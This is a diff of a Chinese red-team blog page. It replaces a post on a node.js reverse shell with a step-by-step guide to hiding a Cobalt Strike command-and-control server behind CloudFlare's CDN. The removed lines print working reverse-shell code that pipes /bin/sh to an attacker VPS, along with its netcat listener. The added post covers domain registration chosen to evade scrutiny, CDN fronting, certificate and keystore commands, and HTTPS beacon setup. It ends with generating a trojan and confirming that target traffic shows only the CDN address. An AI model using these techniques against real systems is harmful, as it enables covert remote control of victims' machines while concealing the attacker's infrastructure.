@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" >
 
-<title>node.js反弹shell | rebootORZ</title>
+<title>利用CloudFlare隐藏C2 | rebootORZ</title>
 <meta name="description" content="一名默默无闻的攻城狮">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -98,40 +98,104 @@
       <div class="sm-12 md-8 col">
         <div class="paper">
           <article class="article">
-            <h1>node.js反弹shell</h1>
+            <h1>利用CloudFlare隐藏C2</h1>
             <p class="article-meta">
-              2021-01-15
+              2021-02-08
               
-                <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge ">
+                <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge success">
                   红队
                 </a>
               
             </p>
             
             <div class="post-content">
-              <p>当环境中有node时，创建shell.js如下：<br>
-**注：**如果没有node.js可以直接安装一下：apt-get install node / yum install node</p>
-<pre><code>(function()){
-    var net = require(&quot;net&quot;),
-    cp = require(&quot;child_process&quot;),
-    sh = cp.spawn(&quot;/bin/sh&quot;,[]);
-    var client = new net.Socket();
-    client.connect(端口,&quot;VPS&quot;,function(){
-        client.pipe(sh.stdin);
-        sh.stdout.pipe(client);
-        sh.stderr.pipe(client);    
-    });
-    return /a/;
-})();
+              <h1 id="弹药">弹药</h1>
+<ul>
+<li>一个域名</li>
+<li>1台VPS</li>
+</ul>
+<h1 id="注册域名">注册域名</h1>
+<p>这里建议使用国外的运营商注册域名，笔记G内的不安全。<br>
+例如用下面这个：<br>
+https://www.namesilo.com</p>
+<h1 id="注册cloudflare">注册CloudFlare</h1>
+<p>这里直接使用邮箱进行注册，CloudFlare不会验证身份真伪直接注册即可。</p>
+<pre><code>https://dash.cloudflare.com/sign-up
 </code></pre>
-<p>VPS监听：</p>
-<pre><code>nc -lvvp 端口
+<p>注册完成后这里会让输入域名，输入我们的根域名即可：<br>
+<img src="https://rebootorz.github.io/post-images/66901033.png" alt="" loading="lazy"></p>
+<p>接着有钱的可以选择付费的，没钱的选择下面免费的即可：<br>
+<img src="https://rebootorz.github.io/post-images/67040366.png" alt="" loading="lazy"><br>
+接着配置如下A记录：<br>
+左边我们的域名，右边VPS IP<br>
+<img src="https://rebootorz.github.io/post-images/67166645.png" alt="" loading="lazy"><br>
+如果域名之前配置过DNS记录，比如刚购买域名的时候运营商默认配置的DNS，或者自己修改过的其他DNS，这里我们需要访问我们的域名管理界面，将原本的DNS服务器修改为CloudFlare提供的下面这两个：<br>
+<img src="https://rebootorz.github.io/post-images/67243351.png" alt="" loading="lazy"></p>
+<h1 id="修改域名dns服务器">修改域名DNS服务器</h1>
+<pre><code>https://www.namesilo.com/account_domains.php
 </code></pre>
-<p>运行：</p>
-<pre><code>node shell.js
+<p>(我这个是已经修改过了的，所以显示的是cloudflare.com)</p>
+<p>点击右侧蓝色按钮<br>
+<img src="https://rebootorz.github.io/post-images/67404351.png" alt="" loading="lazy"><br>
+然后输入那两个域名即可：<br>
+<img src="https://rebootorz.github.io/post-images/67476322.png" alt="" loading="lazy"></p>
+<h1 id="关闭缓存">关闭缓存</h1>
+<p>因为通过CDN的话会有缓存，这会导致我们执行的命令不能够及返回等问题。</p>
+<ul>
+<li>先清除所有缓存：<br>
+<img src="https://rebootorz.github.io/post-images/67666417.png" alt="" loading="lazy"></li>
+<li>再进行自定义配置：<br>
+<img src="https://rebootorz.github.io/post-images/67735878.png" alt="" loading="lazy"><br>
+按照下图进行配置即可：<br>
+<img src="https://rebootorz.github.io/post-images/67781715.png" alt="" loading="lazy"></li>
+</ul>
+<h1 id="配置tls">配置TLS</h1>
+<p><img src="https://rebootorz.github.io/post-images/67841012.png" alt="" loading="lazy"><br>
+以上全部配置完成后，当ping我们的域名时，IP就变成CDN的IP了，从而因此了C2的IP地址。</p>
+<h1 id="使用lets-encrypt签发https证书">使用Let's Encrypt签发https证书</h1>
+<p>**注：**如果使用CS自带的默认证书（../CobalStrike.store）则可以忽略这一步。</p>
+<h2 id="安装certbot">安装certbot</h2>
+<pre><code>sudo apt-get install certbot
 </code></pre>
-<p>VPS获取到反弹的shell:<br>
-<img src="https://rebootorz.github.io/post-images/1610690975077.png" alt="" loading="lazy"></p>
+<h2 id="签发证书">签发证书</h2>
+<pre><code>certbot certonly --standalone -d your-domain.com -d cs1.your-domain.com
+</code></pre>
+<h2 id="打包生成java-keystore">打包生成Java Keystore</h2>
+<pre><code># 切换到证书生成目录
+cd /etc/letsencrypt/live/your-domain.com
+# 打包证书
+openssl pkcs12 -export -in fullchain.pem -inkey privkey.pem -out your-domain.com.p12 -name your-domain.com -passout pass:123456
+# 生成Java keystone
+keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore cs1.your-domain.com.store -srckeystore cs1.your-domain.com.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias cs1.your-domain.com
+</code></pre>
+<h2 id="部署证书并测试可用性">部署证书并测试可用性</h2>
+<p>将keystore文件移动到cobalt strike目录下</p>
+<pre><code>mv cs1.your-domain.com.store /root/cobaltstrike/httpsProfile
+cd /root/cobaltstrike
+</code></pre>
+<p>下载模板文件</p>
+<pre><code>wget https://raw.githubusercontent.com/rsmudge/Malleable-C2-Profiles/master/normal/amazon.profile --no-check-certificate -O /root/cobaltstrike/httpsProfile/https.profile
+</code></pre>
+<p>添加证书配置</p>
+<pre><code>cat &gt;&gt; /root/cobaltstrike/httpsProfile/https.profile &lt;&lt; EOF
+</code></pre>
+<h1 id="启动cobalstrike并加载证书">启动CobalStrike并加载证书：</h1>
+<p>./teamserver &lt;ip_address&gt; &lt; password &gt; &lt; profile_path&gt;</p>
+<h1 id="创建https监听器">创建https监听器</h1>
+<p>创建listener时，选择HTTPS beacon，填入信息如下：<br>
+<strong>注：</strong><br>
+CloudFlare支持的端口并非任意的，只有：</p>
+<pre><code>Cloudflare支持的HTTP端口是：
+80,8080,8880,2052,2082,2086,2095
+Cloudflare支持的HTTPs端口是：
+443,2053,2083,2087,2096,8443
+</code></pre>
+<p><img src="https://rebootorz.github.io/post-images/68309552.png" alt="" loading="lazy"><br>
+然后生成木马，运行即可上线：<br>
+<img src="https://rebootorz.github.io/post-images/68449064.png" alt="" loading="lazy"><br>
+然后在目标机器上抓包查看流量：<br>
+可以看到通讯流量为加密的，且目标地址并非VPS地址，而是CDN地址，只能看到我们的域名。<br>
+<img src="https://rebootorz.github.io/post-images/68555583.png" alt="" loading="lazy"></p>
 
             </div>
           </article>
@@ -142,9 +206,9 @@
               <div class="next">
                 下一篇
               </div>
-              <a href="https://rebootorz.github.io/HdxsJLVVU/">
+              <a href="https://rebootorz.github.io/pJm4kwWjb/">
                 <h3 class="post-title">
-                  Invoke-Obfuscation实现ps1脚本免杀
+                  Github Monitor 部署排错
                 </h3>
               </a>
             </div>
@@ -291,11 +355,11 @@
           红队
         </a>
       
-        <a href="https://rebootorz.github.io/tag/VLOcVZGpM/" class="badge success">
+        <a href="https://rebootorz.github.io/tag/VLOcVZGpM/" class="badge ">
           Golang
         </a>
       
-        <a href="https://rebootorz.github.io/tag/NycXQ8xNz/" class="badge warning">
+        <a href="https://rebootorz.github.io/tag/NycXQ8xNz/" class="badge success">
           渗透技巧
         </a>
       
